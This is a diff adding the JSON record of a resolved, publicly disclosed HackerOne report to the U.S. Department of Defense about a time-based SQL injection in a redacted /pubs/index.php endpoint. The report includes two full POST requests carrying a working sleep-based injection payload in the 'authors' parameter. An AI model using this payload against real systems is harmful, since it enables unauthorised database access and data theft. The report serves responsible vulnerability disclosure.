@@ -1,0 +1,118 @@
+{
+  "id": 2312334,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzEyMzM0",
+  "url": "https://hackerone.com/reports/2312334",
+  "title": "Time based SQL injection at████████",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2024-01-11T14:48:29.103Z",
+  "submitted_at": "2024-01-11T14:48:29.230Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "aziz0x48",
+    "url": "/aziz0x48",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/mhy3gn95r0nlrcsa0geyp35ws5pr/8774a5031fc14b74dc4404da039040c69df8ed41021007c0c2beb9de489fcf66"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-01-26T18:56:56.156Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-01-23T19:35:54.085Z",
+  "team_member_agreed_on_going_public_at": "2024-01-26T18:56:56.044Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Description:**\n\nWhile doing test on██████, I’ve found that the endpoint at /pubs/index.php is vulnerable with SQL injection vulnerability.\nVulnerable parameters are 'years' and 'authors'\n\n## References\nPlease check screenshots attached.\n\n## Impact\n\nTime based SQL injection can lead to the exfiltration of sensitive data from the database.\n\n## System Host(s)\n███████\n\n## Affected Product(s) and Version(s)\n\n\n## CVE Numbers\n\n\n## Steps to Reproduce\n## POC\n\nMake the following POST request to /pubs/index.php\n\n```\nPOST /pubs/index.php HTTP/1.1\nHost:██████\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 68\nOrigin: https://███████\nReferer: https://███████/pubs/index.php\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nTe: trailers\nConnection: close\n\nyears=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(2*2),0))OR'\n```\n\nNotice that the response time will be 4 seconds.\n\n\n```\nPOST /pubs/index.php HTTP/1.1\nHost:█████████\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 68\nOrigin: https://████████\nReferer: https://████/pubs/index.php\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nTe: trailers\nConnection: close\n\nyears=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(5*5),0))OR'\n```\n\nNotice that the response time will be 25 seconds.\n\nThis can be further exploited manually or using automated tools such as SQLmap to get data from the DB, but I will stop here for this report.\n\nThanks.\n\n## Suggested Mitigation/Remediation Actions\n\n\n",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 95,
+  "voters": [
+    "orange303",
+    "m4khn0",
+    "aziz0x48",
+    "maskopatol",
+    "exec_iq",
+    "mr0x1_",
+    "zy9ard3",
+    "irwanjugabro",
+    "0xshari7a",
+    "cosmossec",
+    "and 85 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
